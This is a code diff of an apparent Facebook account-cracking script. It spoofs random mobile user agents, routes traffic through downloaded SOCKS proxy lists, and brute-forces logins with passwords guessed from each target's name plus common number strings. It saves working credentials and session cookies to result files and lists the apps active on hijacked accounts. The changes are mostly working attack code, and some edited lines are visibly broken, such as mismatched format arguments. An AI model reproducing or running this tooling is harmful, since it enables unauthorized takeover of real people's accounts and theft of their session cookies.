@@ -78,31 +78,33 @@ date_now = ("%s-%s-%s-%s"%(day_now,day,_month_,year))
 
 
 for xd in range(10000):
-	a='Mozilla/5.0 (Linux; Android 12;'
-	c=random.choice(['SM-S908U','SM-S998U','SAMSUNG SM-991U','SM-S906N'])
-	v=random.choice(['Build/SP1A.210812.016; wv)','Build/QP1A.190711.020; wv)'])
-	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-	h=random.randrange(73,104)
-	i='0'
-	j=random.randrange(4200,4900)
-	k=random.randrange(40,150)
-	l='Mobile Safari/537.36'
-	uaku=f'{a} {c} {v} {g}{h}.{i}.{j}.{k} {l}'
-	ugen.append(uaku)
+	a='Mozilla/5.0 (Symbian/3; Series60/'
+	b=random.randrange(1, 9)
+	c=random.randrange(1, 9)
+	d='Nokia'
+	e=random.randrange(100, 9999)
+	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
+	g=random.randrange(1, 9)
+	h=random.randrange(1, 4)
+	i=random.randrange(1, 4)
+	j=random.randrange(1, 4)
+	k='Mobile Safari/535.1'
+	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
+	ugen2.append(uaku)
 
 
-	aa='Mozilla/5.0 (Linux; Android'
-	b=random.choice(['6.0','7.1.2','8.1.0','9','10','11','12','13'])
-	c=random.choice(['Redmi Note 4)','Redmi 7)','Redmi Note 7)','Redmi 8)','Redme 6A)','Redmi 8A)','Redmi 6)','Redmi 7A)','Redmi 4X)','Redmi 4A)','Redmi 5)','Redmi 5 Plus)','Redmi Go)','Redmi Y2)','Redmi S2)','Redmi Note 8 Pro)','Redmi Note 8T)'])
+	aa='Mozilla/5.0 (Linux; U; Android;'
+	b=random.choice(['9','10','11','12','13'])
+	c=random.choice(['zh-cn; RMX2121 Build/SP1A.210812.016)','en-US; RMX2001 Build/QP1A.190711.020)','in-id; RMX2001 Build/QP1A.190711.020)','en-US; RMX3081 Build/RKQ1.201112.002)','pl-pl; RMX3081 Build/RKQ1.201112.002)','th-th; RMX3521 Build/RKQ1.211119.001)','RMX3081 Build/RKQ1.201112.002; wv)','RMX3081 Build/SKQ1.210216.001; wv)','RMX2001 Build/QP1A.190711.020; wv)','RMX2001 Build/RP1A.200720.011; wv)','RMX2155 Build/SP1A.210812.016; wv)','RMX2151 Build/QP1A.190711.020; wv)','RMX2151 Build/RP1A.200720.011; wv)','RMX3085 Build/SP1A.210812.016; wv)','RMX3085 Build/RP1A.200720.011; wv)','RMX3521 Build/RKQ1.211119.001; wv)','RMX2061 Build/RKQ1.201112.002; wv)','RMX2063 Build/RKQ1.201112.002; wv)','vi; RMX2061 Build/RKQ1.201112.002)','th-TH; RMX2061 Build/RKQ1.201112.002)','RMX2202 Build/RKQ1.211119.001; wv)','th-th; RMX2202 Build/RKQ1.201105.002)','th-th; RMX2202 Build/SKQ1.210216.001)','zh-CN; RMX2202 Build/RKQ1.211119.001)','th-th; RMX2086 Build/RKQ1.200928.002)','RMX2086 Build/RKQ1.200928.002; wv)'])
 	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
 	h=random.randrange(50,104)
 	i='0'
 	j=random.randrange(4200,4900)
 	k=random.randrange(40,150)
-	x=random.choice(['UCBrowser/12.13.0.1207','OPR/64.3.3282.60839'])
-	l=random.choice(['Mobile Safari/537.36','Mobile Safari/E7FBAF'])
+	x=random.choice(['UCBrowser/13.3.8.1305','XiaoMi/MiuiBrowser/13.11.1-gn','HeyTapBrowser/40.8.2.2'])
+	l='Mobile Safari/537.36'
 	uaku2=f'{aa} {b}; {c} {g}{h}.{i}.{j}.{k} {x} {l}'
-	ugen2.append(uaku2)
+	ugen.append(uaku2)
 
 ###----------[ CHECK THEME COLOR ]---------- ###
 try:
@@ -241,9 +243,9 @@ def setting_proxy():
 	pr = input(f" {N}do you want to use the latest proxy?[y/n] : ")
 	if pr in["y","Y"]:
 		try:
-			os.system('rm -rf data/proxy.txt')
-			url = ses.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt').text
-			open("data/proxy.txt","w").write(url)
+		 os.system('rm -rf data/proxy.txt')
+		 url = ses.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt').text
+		 open("data/proxy.txt","w").write(url)
 		except:pass
 	else:
 		pass
@@ -319,7 +321,7 @@ def otomatis_reguler():
 			saveresulst()
 			for user in id2:
 				try:
-					pwx = []
+					pwx = ['1122334455','1234554321','112233445566','123456654321']
 					uid,nama = user.split('<=>')[0],user.split('<=>')[1].lower()
 					depan = nama.split(" ")[0]
 					if len(nama)<=5:
@@ -328,6 +330,7 @@ def otomatis_reguler():
 						else:
 							pwx.append(nama)
 							pwx.append(depan+"123")
+							pwx.append(depan+"1234")
 							pwx.append(depan+"12345")
 							pwx.append(depan+"123456")
 					else:
@@ -336,10 +339,11 @@ def otomatis_reguler():
 						else:
 							pwx.append(nama)
 							pwx.append(depan+"123")
+							pwx.append(depan+"1234")
 							pwx.append(depan+"12345")
 							pwx.append(depan+"123456")
 					if "free" in mtd_dev:
-						fall.submit(metode_reguler,uid,pwx,"p.facebook.com")
+						fall.submit(metode_reguler,uid,pwx,"free.facebook.com")
 					elif "mbasic" in mtd_dev:
 						fall.submit(metode_reguler,uid,pwx,"mbasic.facebook.com")
 					elif "mobile" in mtd_dev:
@@ -372,6 +376,7 @@ def otomatis_validate():
 						else:
 							pwx.append(nama)
 							pwx.append(depan+"123")
+							pwx.append(depan+"1234")
 							pwx.append(depan+"12345")
 							pwx.append(depan+"123456")
 					else:
@@ -380,6 +385,7 @@ def otomatis_validate():
 						else:
 							pwx.append(nama)
 							pwx.append(depan+"123")
+							pwx.append(depan+"1234")
 							pwx.append(depan+"12345")
 							pwx.append(depan+"123456")
 					if "free" in mtd_dev:
@@ -401,13 +407,13 @@ def otomatis_validate():
 ###----------[ METODE CRACK ]---------- ###
 def metode_reguler(user, pwx, url):
 	global ok,cp,loop
+	redmi = open('data/fb1_000003.txt','r').read().splitlines()
+	ua = random.choice(redmi)
+	nokia = open('data/ugent.txt','r').read().splitlines()
+	ua2 = random.choice(nokia)
 	prox = open("data/proxy.txt","r").read().splitlines()
 	prog.update(des,description=f"crack {str(loop)}/{len(id2)} OK : {H}{len(ok)}{N} CP : {K}{len(cp)}{N}")
 	prog.advance(des)
-	redmi = open('data/mas.txt','r').read().splitlines()
-	ua = random.choice(redmi)
-	nokia = open('data/nokia1.txt','r').read().splitlines()
-	ua2 = random.choice(nokia)
 	for pw in pwx:
 		try:
 			pw = pw.lower()
@@ -416,7 +422,7 @@ def metode_reguler(user, pwx, url):
 			headers1= {
 				"Host":url,
 				"upgrade-insecure-requests":"1",
-				"user-agent":ua2,
+				"user-agent":'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
 				"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1",
 				"x-requested-with":"com.facebook.katana",
 				"sec-fetch-site":"same-origin",
@@ -424,8 +430,8 @@ def metode_reguler(user, pwx, url):
 				"sec-fetch-user":"empty",
 				"sec-fetch-dest":"document",
 				"referer":f"https://{url}/",
-				"accept-encoding":"gzip, deflate br",
-				"accept-language":"en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7"
+				"accept-encoding":"gzip, deflate, br",
+				"accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
 				}
 			p = ses.get(f"https://{url}/login/?next&ref=dbl&fl&refid=8",headers=headers1)
 			data = {
@@ -434,6 +440,8 @@ def metode_reguler(user, pwx, url):
 				"email":user,
 				"pass":pw
 				}
+			#cookie = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
+			#cookie += " m_pixel_ratio=2.625; wd=412x756"
 			headers2 = {
 				"Host": url,
 				"cache-control":"max-age=0",
@@ -448,10 +456,10 @@ def metode_reguler(user, pwx, url):
 				"sec-fetch-user":"empty",
 				"sec-fetch-dest":"document",
 				'referer':f'https://{url}/login/?next&ref=dbl&fl&refid=8',
-				"accept-encoding":"gzip, deflate br",
-				"accept-language":"en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7"
+				"accept-encoding":"gzip, deflate, br",
+				"accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
 				}
-			po = ses.post(f"https://{url}/login/device-based/login/async/?refsrc=https%3A%2F%2F{url}%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data, headers=headers2, proxies=proxy)
+			po = ses.post(f"https://{url}/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data, headers=headers2, proxies=proxy)
 			if "c_user" in ses.cookies.get_dict():
 				ok.append(user)
 				coki = convert(ses.cookies.get_dict())
@@ -463,15 +471,16 @@ def metode_reguler(user, pwx, url):
 					tree.add(f"\r{H}{user}|{pw}{P} ")
 					tree.add(f"{H}{ua}{N}")
 					prints(tree)
-				open("OK/%s.txt"%(date_now),"a").write("  * --> %s|%s|%s\n"%(user, pw))
+				open("OK/%s.txt"%(date_now),"a").write(" %s|%s|%s\n"%(user, pw))
 				break
 			elif "checkpoint" in ses.cookies.get_dict():
 				user = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
 				cp.append(user)
 				tree = Tree("                                 ")
 				tree.add(f"\r{K}{user}|{pw}{P} ")
+				tree.add(f"{K}{ua}{N}")
 				prints(tree)
-				open("CP/%s.txt"%(date_now),"a").write("  * --> %s|%s\n"%(user, pw))
+				open("CP/%s.txt"%(date_now),"a").write(" %s|%s\n"%(user, pw))
 				break
 		except requests.exceptions.ConnectionError:
 			sleep(32)
@@ -480,57 +489,21 @@ def metode_reguler(user, pwx, url):
 	
 def metode_validate(user, pwx, url):
 	global ok,cp,loop
-	prox = open("data/proxy.txt","r").read().splitlines()
-	prog.update(des,description=f"crack {str(loop)}/{len(id2)} OK : {H}{len(ok)}{N} CP : {K}{len(cp)}{N}")
-	prog.advance(des)
-	redmi = open('data/mas.txt','r').read().splitlines()
+	redmi = open('data/fb1_000008.txt','r').read().splitlines()
 	ua = random.choice(redmi)
 	nokia = open('data/nokia1.txt','r').read().splitlines()
 	ua2 = random.choice(nokia)
+	prox = open("data/proxy.txt","r").read().splitlines()
+	prog.update(des,description=f"crack {str(loop)}/{len(id2)} OK : {H}{len(ok)}{N} CP : {K}{len(cp)}{N}")
+	prog.advance(des)
 	for pw in pwx:
 		try:
 			pw = pw.lower()
-			ses=requests.Session()
-			proxy= {"http": "socks5://{random.choice(prox)}"}
-			headers1= {
-				"Host":url,
-				"upgrade-insecure-requests":"1",
-				"user-agent":ua2,
-				"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1",
-				"x-requested-with":"com.facebook.katana",
-				"sec-fetch-site":"same-origin",
-				"sec-fetch-mode":"cors",
-				"sec-fetch-user":"empty",
-				"sec-fetch-dest":"document",
-				"referer":f"https://{url}/",
-				"accept-encoding":"gzip, deflate br",
-				"accept-language":"en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7"
-				}
-			p = ses.get(f"https://{url}/login/?next&ref=dbl&fl&refid=8",headers=headers1)
-			data = {
-				"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
-				"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
-				"email":user,
-				"pass":pw
-				}
-			headers2 = {
-				"Host": url,
-				"cache-control":"max-age=0",
-				"upgrade-insecure-requests":"1",
-				"origin":f"https://{url}",
-				"content-type":"application/x-www-form-urlencoded",
-				"user-agent":ua,
-				"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-				"x-requested-with":"com.facebook.katana",
-				"sec-fetch-site":"same-origin",
-				"sec-fetch-mode":"cors",
-				"sec-fetch-user":"empty",
-				"sec-fetch-dest":"document",
-				'referer':f'https://{url}/login/?next&ref=dbl&fl&refid=8',
-				"accept-encoding":"gzip, deflate br",
-				"accept-language":"en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7"
-				}
-			po = ses.post(f"https://{url}/login/device-based/regular/login/?refsrc=https%3A%2F%2F{url}%2F&lwv=100&refid=8",data=data, headers=headers2, proxies=proxy)
+			ses = requests.Session()
+			url = ses.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=8")
+			headers = {"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer'": "https://m.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
+			data = {"lsd":re.search('name="lsd" value="(.*?)"', str(url.text)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"email":user,"pass": pw}
+			post = ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100", data=data, headers=headers)
 			if "c_user" in ses.cookies.get_dict():
 				ok.append(user)
 				coki = convert(ses.cookies.get_dict())
@@ -542,7 +515,7 @@ def metode_validate(user, pwx, url):
 					tree.add(f"\r{H}{user}|{pw}{P} ")
 					tree.add(f"{H}{ua}{N}")
 					prints(tree)
-				open("OK/%s.txt"%(date_now),"a").write("  * --> %s|%s|%s\n"%(user, pw,coki))
+				open("OK/%s.txt"%(date_now),"a").write("  * --> %s|%s|%s\n"%(user| pw))
 				break
 			elif "checkpoint" in ses.cookies.get_dict():
 				user = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
@@ -554,7 +527,6 @@ def metode_validate(user, pwx, url):
 				break
 		except requests.exceptions.ConnectionError:
 			sleep(32)
-
 	loop+=1
 		
 ###----------[ CONVET LANGUAGE ]---------- ###
@@ -574,7 +546,7 @@ def get_apk(user,pw,cok):
 	language(cookie)
 	tree = Tree("                                 ")
 	tree.add(f"\r{H}{user}|{pw}{N} ")
-	tree.add(f"\r{H}{cok}{N}")
+	tree.add(f"\r{H}{ua}{N}")
 	try:
 		active = Tree(f"\r{N}active application :")
 		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
